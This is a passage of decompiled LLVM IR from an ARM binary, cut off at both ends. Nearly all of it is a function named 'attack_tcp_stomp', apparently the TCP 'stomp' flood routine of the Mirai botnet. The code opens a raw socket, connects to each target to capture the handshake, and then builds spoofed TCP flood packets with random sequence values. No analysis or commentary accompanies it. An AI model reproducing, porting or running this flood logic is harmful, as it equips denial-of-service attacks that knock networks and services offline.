  uselistorder i32 %arg2, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9fa4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_9f78, { 1, 0 }
  uselistorder label %dec_label_pc_9f68, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9f58, { 1, 0 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %bb80, { 1, 0 }
  uselistorder label %dec_label_pc_9cc4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9c94, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9bd0, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_9bb0, { 1, 0 }
  uselistorder label %dec_label_pc_9b8c, { 1, 0 }
  uselistorder label %bb71, { 1, 0 }
  uselistorder label %dec_label_pc_9b3c, { 1, 0 }
  uselistorder label %dec_label_pc_9b20, { 1, 0 }
}

define i32 @attack_tcp_stomp(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %tmp34 = call i16 @__decompiler_undefined_function_3()
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %tmp61 = call i16 @__decompiler_undefined_function_3()
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v27_a0b0 = load i32, i32* @lr, align 4
  store i32 16, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  %v2_a0cc = call i32 @calloc(i32 %arg1, i32 16)
  store i32 4, i32* %r1.global-to-local, align 4
  %v0_a0d8 = load i32, i32* @r6, align 4
  store i32 %v0_a0d8, i32* %r0.global-to-local, align 4
  %v2_a0dc = call i32 @calloc(i32 %v0_a0d8, i32 4)
  %v0_a0e0 = load i32, i32* @r5, align 4
  store i32 %v0_a0e0, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a0f0 = load i32, i32* @r4, align 4
  store i32 %v0_a0f0, i32* %r0.global-to-local, align 4
  %v5_a0f4 = inttoptr i32 %v0_a0e0 to i32*
  %v6_a0f4 = call i32 @attack_get_opt_int(i32 %v0_a0f0, i32* %v5_a0f4, i32 2, i32 0, i32 %v2_a0dc)
  %v1_a100 = urem i32 %v6_a0f4, 256
  store i32 %v1_a100, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_a10c = load i32, i32* @r5, align 4
  store i32 %v0_a10c, i32* %r1.global-to-local, align 4
  %v0_a110 = load i32, i32* @r4, align 4
  store i32 %v0_a110, i32* %r0.global-to-local, align 4
  %v5_a114 = trunc i32 %v6_a0f4 to i8
  %v6_a118 = inttoptr i32 %v0_a10c to i32*
  %v7_a118 = call i32 @attack_get_opt_int(i32 %v0_a110, i32* %v6_a118, i32 3, i32 65535, i32 %v6_a0f4)
  %v0_a11c = load i32, i32* @r5, align 4
  store i32 %v0_a11c, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_a118, i32* @r7, align 4
  %v0_a12c = load i32, i32* @r4, align 4
  store i32 %v0_a12c, i32* %r0.global-to-local, align 4
  %v5_a130 = inttoptr i32 %v0_a11c to i32*
  %v6_a130 = call i32 @attack_get_opt_int(i32 %v0_a12c, i32* %v5_a130, i32 4, i32 64, i32 ptrtoint (i32* @0 to i32))
  %v1_a138 = urem i32 %v6_a130, 256
  store i32 %v1_a138, i32* %ip.global-to-local, align 4
  %v0_a13c = load i32, i32* @r5, align 4
  store i32 %v0_a13c, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_a148 = load i32, i32* @r4, align 4
  store i32 %v0_a148, i32* %r0.global-to-local, align 4
  %sext = mul i32 %v6_a130, 16777216
  %v5_a150 = sdiv i32 %sext, 16777216
  %v6_a150 = inttoptr i32 %v0_a13c to i32*
  %v7_a150 = call i32 @attack_get_opt_int(i32 %v0_a148, i32* %v6_a150, i32 5, i32 1, i32 %v5_a150)
  %v1_a15c = urem i32 %v7_a150, 256
  store i32 %v1_a15c, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_a164 = load i32, i32* @r5, align 4
  store i32 %v0_a164, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_a16c = load i32, i32* @r4, align 4
  store i32 %v0_a16c, i32* %r0.global-to-local, align 4
  %v5_a174 = inttoptr i32 %v0_a164 to i32*
  %v6_a174 = call i32 @attack_get_opt_int(i32 %v0_a16c, i32* %v5_a174, i32 7, i32 65535, i32 %v1_a15c)
  %v0_a178 = load i32, i32* @r5, align 4
  store i32 %v0_a178, i32* %r1.global-to-local, align 4
  %v3_a17c = mul i32 %v6_a174, 65536
  store i32 %v3_a17c, i32* %ip.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a188 = load i32, i32* @r4, align 4
  store i32 %v0_a188, i32* %r0.global-to-local, align 4
  %v3_a18c = urem i32 %v6_a174, 65536
  store i32 %v3_a18c, i32* @sl, align 4
  %v5_a190 = inttoptr i32 %v0_a178 to i32*
  %v6_a190 = call i32 @attack_get_opt_int(i32 %v0_a188, i32* %v5_a190, i32 11, i32 0, i32 ptrtoint (i32* @0 to i32))
  %v1_a198 = urem i32 %v6_a190, 256
  store i32 %v1_a198, i32* %ip.global-to-local, align 4
  %v0_a19c = load i32, i32* @r5, align 4
  store i32 %v0_a19c, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_a1a8 = load i32, i32* @r4, align 4
  store i32 %v0_a1a8, i32* %r0.global-to-local, align 4
  %v5_a1b0 = inttoptr i32 %v0_a19c to i32*
  %v6_a1b0 = call i32 @attack_get_opt_int(i32 %v0_a1a8, i32* %v5_a1b0, i32 12, i32 1, i32 %v1_a198)
  %v1_a1b8 = urem i32 %v6_a1b0, 256
  store i32 %v1_a1b8, i32* %ip.global-to-local, align 4
  %v0_a1bc = load i32, i32* @r5, align 4
  store i32 %v0_a1bc, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_a1c8 = load i32, i32* @r4, align 4
  store i32 %v0_a1c8, i32* %r0.global-to-local, align 4
  %v5_a1d0 = inttoptr i32 %v0_a1bc to i32*
  %v6_a1d0 = call i32 @attack_get_opt_int(i32 %v0_a1c8, i32* %v5_a1d0, i32 13, i32 1, i32 %v1_a1b8)
  %v1_a1d8 = urem i32 %v6_a1d0, 256
  store i32 %v1_a1d8, i32* %ip.global-to-local, align 4
  %v0_a1dc = load i32, i32* @r5, align 4
  store i32 %v0_a1dc, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a1e8 = load i32, i32* @r4, align 4
  store i32 %v0_a1e8, i32* %r0.global-to-local, align 4
  %v5_a1f0 = inttoptr i32 %v0_a1dc to i32*
  %v6_a1f0 = call i32 @attack_get_opt_int(i32 %v0_a1e8, i32* %v5_a1f0, i32 14, i32 0, i32 %v1_a1d8)
  %v1_a1f8 = urem i32 %v6_a1f0, 256
  store i32 %v1_a1f8, i32* %ip.global-to-local, align 4
  %v0_a1fc = load i32, i32* @r5, align 4
  store i32 %v0_a1fc, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a208 = load i32, i32* @r4, align 4
  store i32 %v0_a208, i32* %r0.global-to-local, align 4
  %v5_a210 = inttoptr i32 %v0_a1fc to i32*
  %v6_a210 = call i32 @attack_get_opt_int(i32 %v0_a208, i32* %v5_a210, i32 15, i32 0, i32 %v1_a1f8)
  %v1_a218 = urem i32 %v6_a210, 256
  store i32 %v1_a218, i32* %ip.global-to-local, align 4
  %v0_a21c = load i32, i32* @r5, align 4
  store i32 %v0_a21c, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a228 = load i32, i32* @r4, align 4
  store i32 %v0_a228, i32* %r0.global-to-local, align 4
  %v5_a230 = inttoptr i32 %v0_a21c to i32*
  %v6_a230 = call i32 @attack_get_opt_int(i32 %v0_a228, i32* %v5_a230, i32 16, i32 0, i32 %v1_a218)
  %v1_a238 = urem i32 %v6_a230, 256
  store i32 %v1_a238, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 768, i32* %r3.global-to-local, align 4
  %v0_a244 = load i32, i32* @r5, align 4
  store i32 %v0_a244, i32* %r1.global-to-local, align 4
  %v0_a248 = load i32, i32* @r4, align 4
  store i32 %v0_a248, i32* %r0.global-to-local, align 4
  %v5_a250 = inttoptr i32 %v0_a244 to i32*
  %v6_a250 = call i32 @attack_get_opt_int(i32 %v0_a248, i32* %v5_a250, i32 0, i32 768, i32 %v1_a238)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_a260 = load i32, i32* @r5, align 4
  store i32 %v0_a260, i32* %r1.global-to-local, align 4
  %v0_a264 = load i32, i32* @r4, align 4
  store i32 %v0_a264, i32* %r0.global-to-local, align 4
  %v5_a268 = inttoptr i32 %v0_a260 to i32*
  %v6_a268 = call i32 @attack_get_opt_int(i32 %v0_a264, i32* %v5_a268, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v1_a270 = urem i32 %v6_a268, 256
  store i32 %v1_a270, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_a284 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_a284, i32* %r0.global-to-local, align 4
  %v7_a288 = icmp eq i32 %v3_a284, -1
  store i1 %v7_a288, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_a284, i32* @sb, align 4
  br i1 %v7_a288, label %dec_label_pc_a478, label %dec_label_pc_a294

dec_label_pc_a294:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_a29c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_a29c, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_a2b0 = call i32 @__GI_setsockopt(i32 %v3_a284, i32 0, i32 3, i32 %v6_a29c, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_a2b0, i32* %r0.global-to-local, align 4
  %v7_a2b4 = icmp eq i32 %v5_a2b0, -1
  store i1 %v7_a2b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a2b4, label %dec_label_pc_a470, label %dec_label_pc_a2bc

dec_label_pc_a2bc:                                ; preds = %dec_label_pc_a294
  %v0_a2bc = load i32, i32* @r7, align 4
  %v3_a2bc = mul i32 %v0_a2bc, 65536
  store i32 %v3_a2bc, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r3, align 4
  %v0_a2c4 = load i32, i32* @r6, align 4
  %v2_a2c4 = icmp eq i32 %v0_a2c4, 0
  store i1 %v2_a2c4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  %v3_a2cc = urem i32 %v0_a2bc, 65536
  store i32 %v3_a2cc, i32* @fp, align 4
  br i1 %v2_a2c4, label %dec_label_pc_a6fc, label %dec_label_pc_a2d4.preheader

dec_label_pc_a2d4.preheader:                      ; preds = %dec_label_pc_a2bc
  %v2_a320 = ptrtoint i32* %stack_var_-144 to i32
  %v2_a364 = ptrtoint i32* %stack_var_-64 to i32
  %v2_a39c = ptrtoint i32* %stack_var_-80 to i32
  %v2_a3a8 = ptrtoint i32* %stack_var_-336 to i32
  %v2_a3ac = ptrtoint i32* %stack_var_-48 to i32
  %v4_a40c = zext i8 %tmp to i32
  %v1_a410 = and i32 %v4_a40c, 18
  %v2_a414 = icmp eq i32 %v1_a410, 18
  %v3_a3f8 = sext i16 %tmp61 to i32
  %v1_a41c = and i32 %v4_a40c, 5
  %v2_a41c = icmp eq i32 %v1_a41c, 0
  %v4_a35c = add i32 %v2_a320, 82
  %v5_a35c = inttoptr i32 %v4_a35c to i16*
  %v1_a54c = add i32 %v6_a250, 40
  %v1_a660 = urem i32 %v6_a190, 2
  %tmp97 = sub nsw i32 0, %v1_a660
  %v4_a668 = and i32 %tmp97, 32
  %v1_a678 = urem i32 %v6_a1b0, 2
  %tmp98 = sub nsw i32 0, %v1_a678
  %v4_a680 = and i32 %tmp98, 16
  %v1_a690 = urem i32 %v6_a1d0, 2
  %tmp99 = sub nsw i32 0, %v1_a690
  %v4_a698 = and i32 %tmp99, 8
  %v1_a6a8 = urem i32 %v6_a1f0, 2
  %tmp100 = sub nsw i32 0, %v1_a6a8
  %v4_a6b0 = and i32 %tmp100, 4
  %v1_a6c0 = urem i32 %v6_a210, 2
  %tmp101 = sub nsw i32 0, %v1_a6c0
  %v3_a6c8 = and i32 %tmp101, 2
  %v1_a6d8 = urem i32 %v6_a230, 2
  br label %dec_label_pc_a2d4

dec_label_pc_a2d4:                                ; preds = %dec_label_pc_a2d4.preheader, %dec_label_pc_a448
  %stack_var_-62.0 = phi i16 [ %stack_var_-62.3, %dec_label_pc_a448 ], [ %tmp34, %dec_label_pc_a2d4.preheader ]
  %stack_var_-60.0 = phi i32 [ %stack_var_-60.4, %dec_label_pc_a448 ], [ %tmp37, %dec_label_pc_a2d4.preheader ]
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_a2e0 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_a2e0, i32* %r0.global-to-local, align 4
  %v7_a2e4 = icmp eq i32 %v3_a2e0, -1
  store i1 %v7_a2e4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_a2e0, i32* @r5, align 4
  br i1 %v7_a2e4, label %dec_label_pc_a448, label %dec_label_pc_a2f0

dec_label_pc_a2f0:                                ; preds = %dec_label_pc_a2d4, %dec_label_pc_a424
  %v0_a2f8 = phi i32 [ %v3_a438, %dec_label_pc_a424 ], [ %v3_a2e0, %dec_label_pc_a2d4 ]
  %stack_var_-62.1 = phi i16 [ %stack_var_-62.2, %dec_label_pc_a424 ], [ %stack_var_-62.0, %dec_label_pc_a2d4 ]
  %stack_var_-60.1 = phi i32 [ %v0_a4f8, %dec_label_pc_a424 ], [ %stack_var_-60.0, %dec_label_pc_a2d4 ]
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  %v2_a2f8 = call i32 @__libc_fcntl(i32 %v0_a2f8, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_a300 = or i32 %v2_a2f8, 2048
  store i32 %v1_a300, i32* @r2, align 4
  %v0_a304 = load i32, i32* @r5, align 4
  store i32 %v0_a304, i32* %r0.global-to-local, align 4
  %v2_a308 = call i32 @__libc_fcntl(i32 %v0_a304, i32 4)
  %v3_a30c = load i32, i32* %stack_var_-44, align 4
  %v5_a314 = mul i32 %v3_a30c, 24
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  store i32 %v2_a320, i32* %r0.global-to-local, align 4
  store i32 2, i32* %stack_var_-64, align 4
  %v2_a328 = add i32 %v5_a314, %arg2
  store i32 %v2_a328, i32* %r3.global-to-local, align 4
  %v1_a32c = add i32 %v2_a328, 20
  %v2_a32c = inttoptr i32 %v1_a32c to i8*
  %v3_a32c = load i8, i8* %v2_a32c, align 1
  %v4_a32c = zext i8 %v3_a32c to i32
  store i32 %v4_a32c, i32* %r2.global-to-local, align 4
  %v2_a330 = icmp ugt i8 %v3_a32c, 30
  %v7_a330 = icmp eq i8 %v3_a32c, 31
  store i1 %v7_a330, i1* %cpsr_z.global-to-local, align 1
  %v2_a334 = xor i1 %v7_a330, true
  %v3_a334 = and i1 %v2_a330, %v2_a334
  br i1 %v3_a334, label %bb, label %bb71

bb:                                               ; preds = %dec_label_pc_a2f0
  %v5_a334 = add i32 %v2_a328, 16
  %v6_a334 = inttoptr i32 %v5_a334 to i32*
  %v7_a334 = load i32, i32* %v6_a334, align 4
  store i32 %v7_a334, i32* %r3.global-to-local, align 4
  br label %bb71

bb71:                                             ; preds = %dec_label_pc_a2f0, %bb
  %v4_a338 = phi i32 [ %v2_a328, %dec_label_pc_a2f0 ], [ %v7_a334, %bb ]
  %v4_a338.stack_var_-60.1 = select i1 %v3_a334, i32 %v4_a338, i32 %stack_var_-60.1
  %v2_a33c = xor i1 %v2_a330, true
  %v3_a33c = or i1 %v7_a330, %v2_a33c
  br i1 %v3_a33c, label %dec_label_pc_a484, label %dec_label_pc_a340

dec_label_pc_a340:                                ; preds = %bb71, %dec_label_pc_a484
  %v0_a4f8 = phi i32 [ %v5_a4d4, %dec_label_pc_a484 ], [ %v4_a338.stack_var_-60.1, %bb71 ]
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_a348 = load i32, i32* @sl, align 4
  %v9_a348 = icmp eq i32 %v0_a348, 65535
  store i1 %v9_a348, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a348, label %dec_label_pc_a4e0, label %.thread9

.thread9:                                         ; preds = %dec_label_pc_a340
  %v4_a34c = udiv i32 %v0_a348, 256
  %v2_a350 = urem i32 %v0_a348, 256
  store i32 %v2_a350, i32* %r2.global-to-local, align 4
  %v5_a354 = mul nuw nsw i32 %v2_a350, 256
  %v6_a354 = or i32 %v5_a354, %v4_a34c
  store i32 %v6_a354, i32* %r3.global-to-local, align 4
  store i32 %v2_a320, i32* %r0.global-to-local, align 4
  %v2_a35c = trunc i32 %v6_a354 to i16
  store i16 %v2_a35c, i16* %v5_a35c, align 2
  br label %dec_label_pc_a364

dec_label_pc_a364:                                ; preds = %.thread9, %dec_label_pc_a4e0
  %stack_var_-62.2 = phi i16 [ %v1_a4e0, %dec_label_pc_a4e0 ], [ %stack_var_-62.1, %.thread9 ]
  store i32 %v2_a364, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v0_a36c = load i32, i32* @r5, align 4
  store i32 %v0_a36c, i32* %r0.global-to-local, align 4
  %v3_a370 = call i32 @__libc_connect(i32 %v0_a36c, i32 %v2_a364, i32 16)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_a378 = call i32 @__GI_time(i32* null)
  store i32 %v2_a378, i32* %r0.global-to-local, align 4
  store i32 %v2_a378, i32* @r4, align 4
  %v9_a3d8 = icmp eq i32 %tmp35, %v0_a4f8
  %v4_a400 = zext i16 %stack_var_-62.2 to i32
  %. = zext i1 %v9_a3d8 to i32
  %v9_a3ec = icmp eq i1 %v9_a3d8, false
  %v9_a404 = icmp eq i32 %v3_a3f8, %v4_a400
  br label %dec_label_pc_a394

dec_label_pc_a384:                                ; preds = %.thread, %dec_label_pc_a3f4, %dec_label_pc_a41c, %bb75
  %v2_a384 = call i32 @__GI_time(i32* null)
  %v0_a388 = load i32, i32* @r4, align 4
  %v2_a388 = sub i32 %v2_a384, %v0_a388
  store i32 %v2_a388, i32* %r0.global-to-local, align 4
  %v7_a38c = icmp eq i32 %v2_a388, 10
  store i1 %v7_a38c, i1* %cpsr_z.global-to-local, align 1
  %v8_a390 = icmp sgt i32 %v2_a388, 10
  br i1 %v8_a390, label %dec_label_pc_a424, label %dec_label_pc_a394

dec_label_pc_a394:                                ; preds = %dec_label_pc_a384, %dec_label_pc_a364
  store i32 16, i32* %stack_var_-48, align 4
  store i32 256, i32* %r2.global-to-local, align 4
  store i32 %v2_a3a8, i32* %r1.global-to-local, align 4
  store i32 %v2_a3ac, i32* %ip.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_a3b4 = load i32, i32* @sb, align 4
  store i32 %v0_a3b4, i32* %r0.global-to-local, align 4
  %v6_a3bc = call i32 @__libc_recvfrom(i32 %v0_a3b4, i32 %v2_a3a8, i32 256, i32 16384, i32 %v2_a39c, i32 %v2_a3ac)
  store i32 %v6_a3bc, i32* %r2.global-to-local, align 4
  %v7_a3c4 = icmp eq i32 %v6_a3bc, -1
  store i1 %v7_a3c4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v7_a3c4, label %dec_label_pc_a478, label %dec_label_pc_a3d0

dec_label_pc_a3d0:                                ; preds = %dec_label_pc_a394
  store i32 %v0_a4f8, i32* @r1, align 4
  store i32 %tmp35, i32* @r3, align 4
  store i32 %., i32* %ip.global-to-local, align 4
  %v7_a3e4 = icmp eq i32 %v6_a3bc, 40
  store i1 %v7_a3e4, i1* %cpsr_z.global-to-local, align 1
  %tmp102 = icmp ult i32 %v6_a3bc, 41
  br i1 %tmp102, label %.thread, label %bb75

.thread:                                          ; preds = %dec_label_pc_a3d0
  store i32 0, i32* %ip.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_a384

bb75:                                             ; preds = %dec_label_pc_a3d0
  store i1 %v9_a3ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a3ec, label %dec_label_pc_a384, label %dec_label_pc_a3f4

dec_label_pc_a3f4:                                ; preds = %bb75
  store i32 %v3_a3f8, i32* @lr, align 4
  store i32 %v2_a320, i32* @r3, align 4
  store i32 %v4_a400, i32* %r2.global-to-local, align 4
  store i1 %v9_a404, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a404, label %dec_label_pc_a40c, label %dec_label_pc_a384

dec_label_pc_a40c:                                ; preds = %dec_label_pc_a3f4
  store i32 %v4_a40c, i32* %r2.global-to-local, align 4
  store i32 %v1_a410, i32* @r3, align 4
  store i1 %v2_a414, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a414, label %dec_label_pc_a4f0, label %dec_label_pc_a41c

dec_label_pc_a41c:                                ; preds = %dec_label_pc_a40c
  store i1 %v2_a41c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a41c, label %dec_label_pc_a384, label %dec_label_pc_a424

dec_label_pc_a424:                                ; preds = %dec_label_pc_a41c, %dec_label_pc_a384
  %v0_a424 = load i32, i32* @r5, align 4
  store i32 %v0_a424, i32* %r0.global-to-local, align 4
  %v1_a428 = call i32 @__GI___libc_close(i32 %v0_a424)
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_a438 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_a438, i32* %r0.global-to-local, align 4
  %v3_a43c = icmp eq i32 %v3_a438, -1
  %v8_a43c = icmp eq i32 %v3_a438, -1
  store i1 %v8_a43c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_a438, i32* @r5, align 4
  br i1 %v3_a43c, label %dec_label_pc_a448, label %dec_label_pc_a2f0

dec_label_pc_a448:                                ; preds = %dec_label_pc_a424, %dec_label_pc_a2d4, %bb82
  %stack_var_-62.3 = phi i16 [ %stack_var_-62.0, %dec_label_pc_a2d4 ], [ %stack_var_-62.2, %bb82 ], [ %stack_var_-62.2, %dec_label_pc_a424 ]
  %stack_var_-60.4 = phi i32 [ %stack_var_-60.0, %dec_label_pc_a2d4 ], [ %v0_a4f8, %bb82 ], [ %v0_a4f8, %dec_label_pc_a424 ]
  %v3_a448 = load i32, i32* %stack_var_-44, align 4
  %v1_a44c = add i32 %v3_a448, 1
  store i32 %v1_a44c, i32* @r3, align 4
  %v1_a450 = load i32, i32* @r6, align 4
  %v9_a450 = icmp eq i32 %v1_a44c, %v1_a450
  store i1 %v9_a450, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a44c, i32* %stack_var_-44, align 4
  %v5_a458 = icmp slt i32 %v1_a44c, %v1_a450
  br i1 %v5_a458, label %dec_label_pc_a2d4, label %dec_label_pc_a45c

dec_label_pc_a45c:                                ; preds = %dec_label_pc_a448
  store i32 %v6_a250, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a70c

dec_label_pc_a470:                                ; preds = %dec_label_pc_a294
  %v0_a470 = load i32, i32* @sb, align 4
  store i32 %v0_a470, i32* %r0.global-to-local, align 4
  %v1_a474 = call i32 @__GI___libc_close(i32 %v0_a470)
  store i32 %v1_a474, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a478

dec_label_pc_a478:                                ; preds = %dec_label_pc_a394, %entry, %dec_label_pc_a470
  %v1_a480 = phi i32 [ %v3_a284, %entry ], [ %v1_a474, %dec_label_pc_a470 ], [ 0, %dec_label_pc_a394 ]
  store i32 %v27_a0b0, i32* %lr.global-to-local, align 4
  ret i32 %v1_a480

dec_label_pc_a484:                                ; preds = %bb71
  %v1_a484 = add i32 %v4_a338, 16
  %v2_a484 = inttoptr i32 %v1_a484 to i32*
  %v3_a484 = load i32, i32* %v2_a484, align 4
  store i32 %v3_a484, i32* @r4, align 4
  %v0_a488 = call i32 @rand_next()
  store i32 %v0_a488, i32* %r0.global-to-local, align 4
  %v3_a48c = load i32, i32* %stack_var_-44, align 4
  %v5_a494 = mul i32 %v3_a48c, 24
  %v0_a49c = load i32, i32* @r4, align 4
  %v1_a49c = and i32 %v0_a49c, 16711680
  store i32 %v1_a49c, i32* %ip.global-to-local, align 4
  %v3_a4a0 = udiv i32 %v0_a49c, 16777216
  %v2_a4a4 = add i32 %v5_a494, %arg2
  store i32 %v2_a4a4, i32* %r1.global-to-local, align 4
  %v4_a4a8 = udiv i32 %v1_a49c, 256
  %v5_a4a8 = or i32 %v4_a4a8, %v3_a4a0
  store i32 %v5_a4a8, i32* %r2.global-to-local, align 4
  %v1_a4ac = and i32 %v0_a49c, 65280
  store i32 %v1_a4ac, i32* %r3.global-to-local, align 4
  %v1_a4b0 = add i32 %v2_a4a4, 20
  %v2_a4b0 = inttoptr i32 %v1_a4b0 to i8*
  %v3_a4b0 = load i8, i8* %v2_a4b0, align 1
  %v4_a4b0 = zext i8 %v3_a4b0 to i32
  store i32 %v4_a4b0, i32* %ip.global-to-local, align 4
  %v5_a4b8 = call i32 @llvm.bswap.i32(i32 %v0_a49c)
  %v7_a4bc = lshr i32 %v0_a488, %v4_a4b0
  %v8_a4bc = add i32 %v7_a4bc, %v5_a4b8
  store i32 %v8_a4bc, i32* %r2.global-to-local, align 4
  %v1_a4c0 = and i32 %v8_a4bc, 16711680
  store i32 %v1_a4c0, i32* %r0.global-to-local, align 4
  %v1_a4cc = and i32 %v8_a4bc, 65280
  store i32 %v1_a4cc, i32* %r1.global-to-local, align 4
  %v5_a4d4 = call i32 @llvm.bswap.i32(i32 %v8_a4bc)
  store i32 %v5_a4d4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_a340

dec_label_pc_a4e0:                                ; preds = %dec_label_pc_a340
  %v0_a4e0 = call i32 @rand_next()
  %v1_a4e0 = trunc i32 %v0_a4e0 to i16
  store i32 %v0_a4e0, i32* %r0.global-to-local, align 4
  store i32 %v2_a320, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_a364

dec_label_pc_a4f0:                                ; preds = %dec_label_pc_a40c
  %v3_a4f0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a4f0, i32* @r4, align 4
  store i32 %v2_a0cc, i32* %ip.global-to-local, align 4
  %v5_a4f8 = mul i32 %v3_a4f0, 16
  %v6_a4f8 = add i32 %v5_a4f8, %v2_a0cc
  %v7_a4f8 = inttoptr i32 %v6_a4f8 to i32*
  store i32 %v0_a4f8, i32* %v7_a4f8, align 4
  %v0_a4fc = load i32, i32* @r8, align 4
  %v1_a4fc = add i32 %v0_a4fc, 4
  %v2_a4fc = inttoptr i32 %v1_a4fc to i32*
  %v3_a4fc = load i32, i32* %v2_a4fc, align 4
  store i32 %v3_a4fc, i32* %r1.global-to-local, align 4
  %v1_a508 = and i32 %v3_a4fc, 65280
  store i32 %v1_a508, i32* %r2.global-to-local, align 4
  store i32 %v2_a0cc, i32* %r0.global-to-local, align 4
  %v0_a518 = load i32, i32* @r4, align 4
  %v3_a518 = mul i32 %v0_a518, 16
  %v2_a51c = add i32 %v3_a518, %v2_a0cc
  store i32 %v2_a51c, i32* %ip.global-to-local, align 4
  %v5_a520 = call i32 @llvm.bswap.i32(i32 %v3_a4fc)
  store i32 %v5_a520, i32* %r3.global-to-local, align 4
  %v2_a524 = add i32 %v2_a51c, 4
  %v3_a524 = inttoptr i32 %v2_a524 to i32*
